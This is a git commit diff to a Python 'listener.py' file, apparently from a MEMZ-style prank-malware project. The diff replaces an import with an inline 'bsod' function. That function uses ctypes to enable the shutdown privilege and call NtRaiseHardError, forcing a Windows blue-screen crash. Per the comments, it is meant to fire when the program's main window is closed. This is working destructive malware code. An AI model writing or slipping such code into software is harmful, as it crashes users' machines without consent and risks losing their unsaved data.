134091a5d310d596bae36e4e50f5561053020e99
arenacloser-Z <166559903+arenacloser-Z@users.noreply.github.com>
2024-05-08 13:47:58 -0400

    Update listener.py

--- listener.py
+++ listener.py
@@ -2,7 +2,18 @@
 #if this happens, the code will launch a barrage of errors that will result in a BSOD
 #this will likely be created into a seperate, larger project
 
-from MEMZmain import bsod
+import ctypes
+
+def bsod():
+    ntdll = ctypes.windll.ntdll
+    prev_value = ctypes.c_bool()
+    res = ctypes.c_ulong()
+    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+        print("BSOD Successfull!")
+    else:
+        print("BSOD Failed...")
+
 
 while True:
   #if window main closed(possible restart):
